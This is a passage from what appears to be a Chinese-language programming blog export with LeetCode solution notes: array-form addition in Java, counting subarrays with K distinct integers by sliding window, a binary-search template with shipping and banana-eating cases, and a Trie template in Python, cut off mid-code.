<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: A = [1,2,0,0], K = 34</span><br><span class="line">Output: [1,2,3,4]</span><br><span class="line">Explanation: 1200 + 34 = 1234</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: A = [2,7,4], K = 181</span><br><span class="line">Output: [4,5,5]</span><br><span class="line">Explanation: 274 + 181 = 455</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: A = [2,1,5], K = 806</span><br><span class="line">Output: [1,0,2,1]</span><br><span class="line">Explanation: 215 + 806 = 1021</span><br></pre></td></tr></table></figure>

<p><strong>Example 4:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: A = [9,9,9,9,9,9,9,9,9,9], K = 1</span><br><span class="line">Output: [1,0,0,0,0,0,0,0,0,0,0]</span><br><span class="line">Explanation: 9999999999 + 1 = 10000000000</span><br></pre></td></tr></table></figure>

<p><strong>Note：</strong></p>
<ol>
<li><code>1 &lt;= A.length &lt;= 10000</code></li>
<li><code>0 &lt;= A[i] &lt;= 9</code></li>
<li><code>0 &lt;= K &lt;= 10000</code></li>
<li>If <code>A.length &gt; 1</code>, then <code>A[0] != 0</code></li>
</ol>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>给一个数组形式的整数 <code>X</code> 和一个整数 <code>K</code>，求 <code>X+K</code>，其中 <code>X</code> 和 <code>K</code> 都是五位数以内的整数，所以无需考虑溢出。</p>
<p>拆解 <code>K</code> 成 Array-Form 类型得到一个整数，然后两个数组末位对齐，逐位相加即可。</p>
<p>拆解 <code>K</code> 的过程可以取余，余数与 X 的末位相加即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (K != <span class="number">0</span>) &#123;</span><br><span class="line">    r = K % <span class="number">10</span>;</span><br><span class="line">    K = K / <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><p>根据上述分析，代码实现如下，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">addToArrayForm</span><span class="params">(<span class="type">int</span>[] A, <span class="type">int</span> K)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> A.length-<span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">            <span class="keyword">if</span> (K!=<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> K%<span class="number">10</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> A[i];</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> a + b + carry;</span><br><span class="line">                carry = sum / <span class="number">10</span>;</span><br><span class="line">                A[i] = sum % <span class="number">10</span>;</span><br><span class="line">                K /= <span class="number">10</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> A[i] + carry;</span><br><span class="line">                <span class="keyword">if</span>( sum &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                    A[i] = sum;</span><br><span class="line">                    carry = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    A[i] = sum % <span class="number">10</span>;</span><br><span class="line">                    carry = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        List&lt;Integer&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(K != <span class="number">0</span>) &#123;</span><br><span class="line">            K += carry;</span><br><span class="line">            Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span>(K != <span class="number">0</span>) &#123;</span><br><span class="line">                stack.push(K % <span class="number">10</span>);</span><br><span class="line">                K /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(!stack.isEmpty()) &#123;</span><br><span class="line">                ans.add(stack.pop());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(carry == <span class="number">1</span>) &#123;</span><br><span class="line">            ans.add(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; A.length; i++) &#123;</span><br><span class="line">            ans.add(A[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-992 Subarrays with K Differant Integers</title>
    <url>/fundamental/algorithm/lc-992-subarrays-with-k-different-integers/</url>
    <content><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p> <a href="https://leetcode.com/problems/subarrays-with-k-different-integers/">https://leetcode.com/problems/subarrays-with-k-different-integers/</a> </p>
<p>给定一个数组 A，求有 k 个不同元素组成的子数组个数。</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: A = [1,2,1,2,3], K = 2</span><br><span class="line">Output: 7</span><br><span class="line">Explanation: Subarrays formed with exactly 2 different integers: [1,2], [2,1], [1,2], [2,3], [1,2,1], [2,1,2], [1,2,1,2].</span><br></pre></td></tr></table></figure>

<span id="more"></span>


<h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>根据题意，数组长度 n 的取值区间为 <code>[1, 20000]</code>，数组元素取值区间为 <code>[1, n]</code>，说明最多可能有 n 个不同元素，k 取值区间也是 <code>[1, n]</code>，需要考虑 <code>k &gt; count(distinct A[i])</code> 的情况。考虑如下测试用例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Case 0: k &gt; count(distinct A[i])</span></span><br><span class="line">A = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>], k = <span class="number">2</span></span><br><span class="line"><span class="title class_">Output</span>: <span class="number">0</span></span><br><span class="line"><span class="comment">// Case 1: k == count(distinct A[i])</span></span><br><span class="line">A = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], k = <span class="number">3</span></span><br><span class="line"><span class="comment">// Case 2: k &lt; count(distinct A[i])</span></span><br></pre></td></tr></table></figure>



<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>第一眼看应该是使用滑窗，根据之前的总结滑窗的模板如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">slidingWindowTemplate</span>(<span class="params">s, t</span>):</span><br><span class="line">        <span class="comment"># 定义其他变量，存储结果，存储判断条件等变量</span></span><br><span class="line">        begin = end = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> f(end): <span class="comment"># case 1: slide end</span></span><br><span class="line">            <span class="comment"># do something</span></span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> g(): <span class="comment"># case 2: slide begin</span></span><br><span class="line">                <span class="comment"># do something</span></span><br><span class="line">                 begin += <span class="number">1</span></span><br><span class="line">                    </span><br><span class="line">                <span class="comment"># meet some condition</span></span><br></pre></td></tr></table></figure>

<p>使用滑窗需要思考两个问题：</p>
<ol>
<li>什么时候滑动 end 指针？</li>
<li>什么时候滑动 begin 指针？</li>
</ol>
<p>经过思考直接求解不好求，我们换个思路：最多包含 k 个不同元素的子数组有多少个？滑窗 + HashMap 是解决这类问题最常用的方案。代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">atMostKDistinct</span>(<span class="params">A, k</span>):</span><br><span class="line">    begin = end = <span class="number">0</span></span><br><span class="line">    window = collections.defaultdict(<span class="built_in">int</span>)</span><br><span class="line">    n, distinct = <span class="built_in">len</span>(A), <span class="number">0</span> <span class="comment"># distinct indicate count of sliding window</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> end &lt; n:</span><br><span class="line">        e = A[end]</span><br><span class="line">        <span class="keyword">if</span> window[e] == <span class="number">0</span>:</span><br><span class="line">            distinct += <span class="number">1</span></span><br><span class="line">        window[e] += <span class="number">1</span></span><br><span class="line">        end += <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> distinct &gt; k:</span><br><span class="line">            b = A[begin]</span><br><span class="line">            window[b] -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> window[b] == <span class="number">0</span>:</span><br><span class="line">                distinct -= <span class="number">1</span></span><br><span class="line">            begin += <span class="number">1</span></span><br><span class="line">        <span class="comment"># [begin, end) has end - begin items that is numbers of subarray end of A[end]</span></span><br><span class="line">        ans += end - begin</span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>



<p><strong>记 f(k) 为小于等于 k 个不同元素的子数组个数，则 f(k-1) 为小于等于 k - 1 个不同元素的子数组个数。所以，确切的有 k 个不同元素的子数组个数 &#x3D; f(k) - f(k-1)。</strong></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>根据如上分析，完整代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subarraysWithKDistinct</span>(<span class="params">self, A: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">atMostKDistinct</span>(<span class="params">k</span>):</span><br><span class="line">            begin = end = <span class="number">0</span></span><br><span class="line">            window = collections.defaultdict(<span class="built_in">int</span>)</span><br><span class="line">            n, distinct = <span class="built_in">len</span>(A), <span class="number">0</span> <span class="comment"># distinct indicate count of sliding window</span></span><br><span class="line">            ans = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> end &lt; n:</span><br><span class="line">                e = A[end]</span><br><span class="line">                <span class="keyword">if</span> window[e] == <span class="number">0</span>:</span><br><span class="line">                    distinct += <span class="number">1</span></span><br><span class="line">                window[e] += <span class="number">1</span></span><br><span class="line">                end += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> distinct &gt; k:</span><br><span class="line">                    b = A[begin]</span><br><span class="line">                    window[b] -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> window[b] == <span class="number">0</span>:</span><br><span class="line">                        distinct -= <span class="number">1</span></span><br><span class="line">                    begin += <span class="number">1</span></span><br><span class="line">                <span class="comment"># [begin, end) has end - begin items that is end - begin subarrays</span></span><br><span class="line">                ans += end - begin</span><br><span class="line">            <span class="keyword">return</span> ans</span><br><span class="line">        <span class="keyword">return</span> atMostKDistinct(k) - atMostKDistinct(k-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>在 [begin, end) 区间中，以 A[end-1] 结尾的子数组个数是 end - begin，所以 <code>ans += end - begin</code></strong></p>
<p>相关题目 -  <a href="https://leetcode.com/problems/count-number-of-nice-subarrays/">https://leetcode.com/problems/count-number-of-nice-subarrays/</a> </p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Sliding Window</tag>
      </tags>
  </entry>
  <entry>
    <title>二分法解题模板</title>
    <url>/fundamental/algorithm/lc-binary-search-template/</url>
    <content><![CDATA[<h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><p>今天重新审视了二分法，结合同事的思考认为，</p>
<blockquote>
<p>二分的本质是，在一段或多段单调序列里找分界点</p>
</blockquote>
<p>使用左开右闭 <code>[l, r)</code> 的模板如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">binary_search</span>(<span class="params">l, r</span>):</span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        m = l + (r - l) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> f(m): <span class="keyword">return</span> m <span class="comment"># optional</span></span><br><span class="line">        <span class="keyword">if</span> g(m):</span><br><span class="line">            r = m  <span class="comment"># new range [l, m)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span> <span class="comment"># new range [m+1, r)</span></span><br><span class="line">    <span class="keyword">return</span> l <span class="comment"># or not found</span></span><br></pre></td></tr></table></figure>

<p><code>m</code> 如果满足查找条件，即 <code>f(m)</code> 返回 <code>true</code>，则查找结束。如果 <code>f(m)</code> 返回 <code>false</code>， 则根据 <code>g(m)</code> 的结果构造新的查找区间。如果新区间在左边，则新的左闭右开区间是 <code>[l, m)</code> 等价于 <code>[l, m-1]</code>；如果新区间在右边，则新的左闭右开是 <code>[m+1, r)</code>。</p>
<span id="more"></span>

<p>Return the lower_bound &#x2F; upper_bound of a value x in a sorted array.</p>
<p>lower_bound(A, x): first index of i, such that A[i] &gt;&#x3D; x</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lower_bound</span>(<span class="params">A, x, l, r</span>):</span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> A[m] &gt;= x:</span><br><span class="line">            r = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">     <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure>

<p>if <code>A[m] == x</code>, still need to update right bound to m as there are probable mutiple x at the left of m.</p>
<p>upper_bound(A, x): first index of i, such that A[i] &gt; x</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">upper_bound</span>(<span class="params">A, x, l, r</span>):</span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> A[m] &gt; x:</span><br><span class="line">            r = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">     <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure>

<h2 id="案例应用"><a href="#案例应用" class="headerlink" title="案例应用"></a>案例应用</h2><h3 id="案例-1：Capacity-to-Ship-Packages-Within-D-Days"><a href="#案例-1：Capacity-to-Ship-Packages-Within-D-Days" class="headerlink" title="案例 1：Capacity to Ship Packages Within D Days"></a>案例 1：Capacity to Ship Packages Within D Days</h3><p><a href="https://leetcode.com/problems/capacity-to-ship-packages-within-d-days/">https://leetcode.com/problems/capacity-to-ship-packages-within-d-days/</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">shipWithinDays</span>(<span class="params">self, weights: <span class="type">List</span>[<span class="built_in">int</span>], D: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">        l, r = <span class="built_in">max</span>(weights), <span class="built_in">sum</span>(weights)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> l &lt; r:</span><br><span class="line">            m = (l + r) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">            s = <span class="number">0</span></span><br><span class="line">            rounds = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(weights)):</span><br><span class="line">                <span class="keyword">if</span> s + weights[i] &lt;= m:</span><br><span class="line">                    s += weights[i]</span><br><span class="line">                <span class="keyword">else</span>: <span class="comment"># overload, need next round</span></span><br><span class="line">                    s = weights[i]</span><br><span class="line">                    rounds += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> rounds &lt;= D:</span><br><span class="line">                r = m</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l = m + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure>

<h3 id="案例-2：Coko-Eating-Bananas"><a href="#案例-2：Coko-Eating-Bananas" class="headerlink" title="案例 2：Coko Eating Bananas"></a>案例 2：Coko Eating Bananas</h3><p><a href="https://leetcode.com/problems/koko-eating-bananas/">https://leetcode.com/problems/koko-eating-bananas/</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minEatingSpeed</span>(<span class="params">self, piles: <span class="type">List</span>[<span class="built_in">int</span>], H: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        l, r = <span class="number">1</span>, <span class="built_in">max</span>(piles) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> l &lt; r:</span><br><span class="line">            m = l + (r - l) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">            time = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> piles:</span><br><span class="line">                time += math.ceil(x / m)</span><br><span class="line">            <span class="keyword">if</span> time &lt;= H:</span><br><span class="line">                r = m</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l = m + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
      </tags>
  </entry>
  <entry>
    <title>Trie tree 解题模板</title>
    <url>/fundamental/algorithm/lc-trie-tree-template/</url>
    <content><![CDATA[<h2 id="什么是-Trie-树？"><a href="#什么是-Trie-树？" class="headerlink" title="什么是 Trie 树？"></a>什么是 Trie 树？</h2><p><strong>Trie 树</strong>（发音”try”），又称<strong>前缀树</strong>或<strong>字典树</strong>，是一种树形数据结构，用于高效存储和检索字符串数据集中的键。</p>
<span id="more"></span>

<p><strong>典型应用场景</strong>:</p>
<ul>
<li>自动补全（搜索框）</li>
<li>拼写检查</li>
<li>IP 路由（最长前缀匹配）</li>
<li>单词搜索游戏</li>
<li>字符串前缀&#x2F;后缀查询</li>
</ul>
<p><strong>时间复杂度</strong>:</p>
<ul>
<li>插入: O(m) - m 是字符串长度</li>
<li>查找: O(m)</li>
<li>前缀搜索: O(m)</li>
</ul>
<p><strong>优势</strong>:</p>
<ul>
<li>查找效率高于哈希表（处理前缀）</li>
<li>不存在哈希冲突</li>
<li>可以按字典序遍历</li>
</ul>
<hr>
<h2 id="模板-Python"><a href="#模板-Python" class="headerlink" title="模板 (Python)"></a>模板 (Python)</h2><h3 id="模板-1-标准-Trie-树实现"><a href="#模板-1-标准-Trie-树实现" class="headerlink" title="模板 1: 标准 Trie 树实现"></a>模板 1: 标准 Trie 树实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TrieNode</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Trie树的节点&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 子节点字典 &#123;&#x27;a&#x27;: TrieNode, &#x27;b&#x27;: TrieNode, ...&#125;</span></span><br><span class="line">        <span class="variable language_">self</span>.children = &#123;&#125;</span><br><span class="line">        <span class="comment"># 标记是否为单词结尾</span></span><br><span class="line">        <span class="variable language_">self</span>.is_end_of_word = <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 可选：存储单词本身（某些题目需要）</span></span><br><span class="line">        <span class="comment"># self.word = None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Trie</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;标准Trie树实现&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化根节点&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.root = TrieNode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        插入单词到Trie树</span></span><br><span class="line"><span class="string">        时间复杂度: O(m), m为单词长度</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">            <span class="comment"># 如果字符不存在，创建新节点</span></span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node.children:</span><br><span class="line">                node.children[char] = TrieNode()</span><br><span class="line">            <span class="comment"># 移动到下一个节点</span></span><br><span class="line">            node = node.children[char]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 标记单词结束</span></span><br><span class="line">        node.is_end_of_word = <span class="literal">True</span></span><br><span class="line">        <span class="comment"># node.word = word  # 可选：存储完整单词</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        查找完整单词是否存在</span></span><br><span class="line"><span class="string">        时间复杂度: O(m)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node.children:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            node = node.children[char]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 必须是完整单词</span></span><br><span class="line">        <span class="keyword">return</span> node.is_end_of_word</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">starts_with</span>(<span class="params">self, prefix: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        查找是否存在以prefix开头的单词</span></span><br><span class="line"><span class="string">        时间复杂度: O(m)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> prefix:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node.children:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            node = node.children[char]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 只要前缀存在即可，不需要是完整单词</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        删除单词（可选功能）</span></span><br><span class="line"><span class="string">        返回是否成功删除</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">_delete_helper</span>(<span class="params">node, word, index</span>):</span><br><span class="line">            <span class="keyword">if</span> index == <span class="built_in">len</span>(word):</span><br><span class="line">                <span class="comment"># 到达单词末尾</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> node.is_end_of_word:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 单词不存在</span></span><br><span class="line"></span><br><span class="line">                node.is_end_of_word = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># 如果该节点没有子节点，可以删除</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">len</span>(node.children) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            char = word[index]</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node.children:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 单词不存在</span></span><br><span class="line"></span><br><span class="line">            child = node.children[char]</span><br><span class="line">            should_delete_child = _delete_helper(child, word, index + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> should_delete_child:</span><br><span class="line">                <span class="keyword">del</span> node.children[char]</span><br><span class="line">                <span class="comment"># 如果当前节点不是其他单词的结尾且没有其他子节点</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">not</span> node.is_end_of_word <span class="keyword">and</span> <span class="built_in">len</span>(node.children) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> _delete_helper(<span class="variable language_">self</span>.root, word, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">trie = Trie()</span><br><span class="line">trie.insert(<span class="string">&quot;apple&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(trie.search(<span class="string">&quot;apple&quot;</span>))      <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(trie.search(<span class="string">&quot;app&quot;</span>))        <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(trie.starts_with(<span class="string">&quot;app&quot;</span>))   <span class="comment"># True</span></span><br><span class="line">trie.insert(<span class="string">&quot;app&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(trie.search(<span class="string">&quot;app&quot;</span>))        <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="模板-2-紧凑版-Trie"><a href="#模板-2-紧凑版-Trie" class="headerlink" title="模板 2: 紧凑版 Trie"></a>模板 2: 紧凑版 Trie</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Trie</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;紧凑版Trie - 面试推荐&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.root = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">            node = node.setdefault(char, &#123;&#125;)</span><br><span class="line">        node[<span class="string">&#x27;#&#x27;</span>] = <span class="literal">True</span>  <span class="comment"># 用&#x27;#&#x27;标记单词结束</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            node = node[char]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> node</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">starts_with</span>(<span class="params">self, prefix: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> prefix:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            node = node[char]</span><br><span class="line">        <span class="keyword">return</span> <span 